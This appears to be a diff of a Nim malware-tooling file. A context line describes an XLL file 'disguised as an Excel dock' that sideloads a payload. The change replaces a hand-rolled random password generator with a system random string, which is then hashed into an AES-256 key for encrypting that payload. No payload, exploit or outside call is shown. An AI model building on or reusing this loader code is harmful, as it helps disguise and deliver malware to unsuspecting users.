@@ -3,7 +3,7 @@ import os
 import base64
 import nimcrypto
 import strutils
-import random
+import sysrandom
 
 
 
@@ -80,9 +80,7 @@ XLL - disguised as an Excel dock, sideloads payload
 
 
 
-proc rndStr: string =
-    for _ in .. 42:
-        add(result, char(rand(int('A') .. int('z'))))
+
 
 
 proc main() = 
@@ -106,8 +104,7 @@ proc main() =
         iv: array[aes256.sizeBlock, byte]
         encrypted: seq[byte] = newSeq[byte](len(plaintext))
     iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149] #static still for new 
-    randomize()
-    var newpassword: string = rndStr()
+    var newpassword: string = getRandomString(32)
     var expandedKey = sha256.digest(newpassword)
     copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))
 
